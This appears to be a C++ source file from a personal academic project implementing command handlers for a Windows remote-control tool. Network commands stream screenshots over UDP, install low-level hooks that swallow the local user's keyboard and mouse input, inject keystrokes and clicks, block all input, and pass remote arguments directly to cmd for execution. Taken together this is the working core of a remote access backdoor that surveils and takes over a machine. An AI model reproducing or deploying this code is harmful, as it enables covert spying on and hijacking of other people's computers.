// This is a personal academic project. Dear PVS-Studio, please check it.
// PVS-Studio Static Code Analyzer for C, C++ and C#: http://www.viva64.com

#include "..\Service\pch.hpp"

#include "CommandProperties.hpp"
#include "..\Network\UDP\UDPParticipiant.hpp"
#include "..\Network\Protocols\ImageMessageProtocol.hpp"
#include "..\Capturing\ScreenCapturer.hpp"
#include "..\Service\Debugger.hpp"

const std::array<CommandProperties, static_cast<std::size_t>(Commands::NUMBER_OF_COMMANDS)> COMMAND_PROPERTIES
{ {
	{ std::make_tuple(Commands::MESSAGEBOX,        "message"), _onCmd_MESSAGEBOX        },
	{ std::make_tuple(Commands::VIEWDESKTOP_START, "vdstart"), _onCmd_VIEWDESKTOP_START },
	{ std::make_tuple(Commands::VIEWDESKTOP_STOP,  "vdstop"),  _onCmd_VIEWDESKTOP_STOP  },
	{ std::make_tuple(Commands::KEYBOARDCTRL_ON,   "kbon"),    _onCmd_KEYBOARDCTRL_ON   },
	{ std::make_tuple(Commands::KEYBOARDCTRL_OFF,  "kboff"),   _onCmd_KEYBOARDCTRL_OFF  },
	{ std::make_tuple(Commands::MOUSECTRL_ON,      "mon"),     _onCmd_MOUSECTRL_ON      },
	{ std::make_tuple(Commands::MOUSECTRL_OFF,     "moff"),    _onCmd_MOUSECTRL_OFF     },
	{ std::make_tuple(Commands::EXECUTECMD,        "cmd"),     _onCmd_EXECUTECMD        },
	{ std::make_tuple(Commands::BLOCKINPUT_ON,     "bion"),    _onCmd_BLOCKINPUT_ON     },
	{ std::make_tuple(Commands::BLOCKINPUT_OFF,    "bioff"),   _onCmd_BLOCKINPUT_OFF    }
} };

namespace detail
{
	namespace hooks
	{
		namespace data
		{
			static HHOOK mouseHook;
			static HHOOK keyboardHook;
		}

		LRESULT CALLBACK LowLevelMouseProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam) noexcept
		{
			if (nCode == HC_ACTION)
				return (-1);

			return CallNextHookEx(data::mouseHook, nCode, wParam, lParam);
		}

		LRESULT CALLBACK LowLevelKeyboardProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam) noexcept
		{
			if (nCode == HC_ACTION)
				return (-1);

			return CallNextHookEx(data::keyboardHook, nCode, wParam, lParam);
		}
	} // namespace hooks

	namespace emulator
	{
		inline static constexpr std::size_t DELAY = 100;

		bool SendMouseInput(DWORD button) noexcept
		{
			INPUT input = { INPUT_MOUSE };
			input.mi.dwFlags = button;

			if (SendInput(1, &input, sizeof(INPUT)) != 1)
				return false;

			SleepEx(DELAY, FALSE);

			input.mi.dwFlags = (button <<= 1);
			if (SendInput(1, &input, sizeof(INPUT)) != 1)
				return false;
			
			return true;
		}

		bool SendKeyboardInput(UINT key) noexcept
		{
			INPUT input = { INPUT_KEYBOARD };
			input.ki.wScan = MapVirtualKey(key, MAPVK_VK_TO_VSC);
			input.ki.wVk   = key;

			if (SendInput(1, &input, sizeof(INPUT)) != 1)
				return false;

			SleepEx(DELAY, FALSE);

			input.ki.dwFlags = KEYEVENTF_KEYUP;
			if (SendInput(1, &input, sizeof(INPUT)) != 1)
				return false;

			return true;
		}
	} // namespace emulator
} // namespace detail

#pragma region Functions

bool _onCmd_MESSAGEBOX(const args_t &args)
{
	if(args.empty())
		return false;

	return (MessageBox(nullptr, args.at(0).c_str(), "MESSAGE", MB_ICONERROR | MB_OK | MB_SYSTEMMODAL) != 0);
}

void _onCmd_VIEWDESKTOP_START(const args_t&, cip_t &cip, std::size_t pos, boost::asio::io_context &io_context, const boost::asio::ip::udp::endpoint &endpoint) //-V2009
{
#pragma warning(suppress : 26414)
	// warning C26414: Move, copy, reassign or reset a local smart pointer 'server' (r.5).
	std::unique_ptr<UDPParticipiant> server{ std::make_unique<UDPParticipiant>(io_context, endpoint) } ;
	std::shared_ptr<ScreenCapturer>  scapt { ScreenCapturer::create<ScreenCapturer>() };
	std::shared_ptr<IMPROTO>         imsg  { std::make_shared<IMPROTO>() };
	while (cip[pos])
	{	
		imsg->clear_data();

		scapt->capture();

		imsg->set_data_length(scapt->get_data_size());
		std::copy_n(scapt->get_data().get(), imsg->get_data_length(), std::begin(imsg->get_data()));

		server->send(imsg);
		$INFO("Sent %llu bytes\n", imsg->get_data_length())
	}
}

void _onCmd_VIEWDESKTOP_STOP(const args_t&, cip_t &cip, std::size_t pos, boost::asio::io_context&, const boost::asio::ip::udp::endpoint&)
{
	cip[pos] = false; // TODO: mutex
}

bool _onCmd_KEYBOARDCTRL_ON(const args_t &args)
{
	if (!detail::hooks::data::keyboardHook)
		detail::hooks::data::keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, detail::hooks::LowLevelKeyboardProc, nullptr, 0ul);

	if (UINT key{}; sscanf_s(args.at(0).c_str(), "%u", &key))
		return detail::emulator::SendKeyboardInput(key);

	return true;
}

bool _onCmd_KEYBOARDCTRL_OFF(const args_t&) noexcept
{
	return UnhookWindowsHookEx(detail::hooks::data::keyboardHook);;
}

bool _onCmd_MOUSECTRL_ON(const args_t &args) 
{
	if(!detail::hooks::data::mouseHook)
		detail::hooks::data::mouseHook = SetWindowsHookEx(WH_MOUSE_LL, detail::hooks::LowLevelMouseProc, nullptr, 0ul);

	int   x{},
		  y{};
	DWORD button{};
	if (sscanf_s(args.at(0).c_str(), "%d %d %lu", &x, &y, &button) == 3 && !detail::emulator::SendMouseInput(button))
		return false;

	return SetCursorPos(x, y);
}

bool _onCmd_MOUSECTRL_OFF(const args_t&) noexcept
{
	return UnhookWindowsHookEx(detail::hooks::data::mouseHook);
}

bool _onCmd_EXECUTECMD(const args_t &args)
{
	std::string params;
#pragma warning(push)
#pragma warning(disable : 26486 26489)
	// warning C26486: Don't pass a pointer that may be invalid to a function. Parameter 1 '{InvalidLoc}' in call to 'std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator+=' may be invalid (lifetime.1).
	// warning C26489: Don't dereference a pointer that may be invalid: 'arg'. 'arg' may have been invalidated at line 169 (lifetime.1).
	if(!args.empty())
		for (const auto &arg : args)
			params += arg;

#pragma warning(suppress : 26476)
	// warning C26476: Expression/symbol '{0}' uses a naked union 'union ' with multiple type pointers: Use variant instead (type.7).
	SHELLEXECUTEINFO sei{ };
	sei.cbSize = sizeof(SHELLEXECUTEINFO);
	sei.fMask        = SEE_MASK_ASYNCOK | SEE_MASK_NO_CONSOLE;
	sei.lpVerb       = TEXT("open");
	sei.lpFile       = TEXT("cmd");  
	sei.lpParameters = params.c_str();
	sei.nShow        = SW_SHOW;

#pragma warning(suppress : 26486)
	// warning C26486: Don't pass a pointer that may be invalid to a function. Parameter 1 'sei.hIcon' in call to 'ShellExecuteExA' may be invalid (lifetime.1).
	return ShellExecuteEx(&sei);
}

bool _onCmd_BLOCKINPUT_ON(const args_t&) noexcept
{
	return BlockInput(true);
}

bool _onCmd_BLOCKINPUT_OFF(const args_t&) noexcept
{
	return BlockInput(false);
}

#pragma endregion